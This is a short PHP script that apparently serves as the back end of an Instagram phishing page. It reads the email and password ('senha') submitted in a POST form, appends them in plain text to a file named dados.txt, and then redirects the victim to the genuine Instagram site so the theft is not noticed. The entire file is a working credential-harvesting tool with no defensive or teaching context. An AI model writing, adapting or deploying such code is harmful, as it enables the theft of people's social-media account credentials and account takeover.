<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $senha = $_POST["senha"];
    
    $dados = "Login: " . $email . "\nSenha: " . $senha . "\n\n";
    
    file_put_contents("dados.txt", $dados, FILE_APPEND);
    
    // Redirecionar para o Instagram - FILHO DA PUTA

    header("Location: https://www.instagram.com/");
    exit;
}
?>

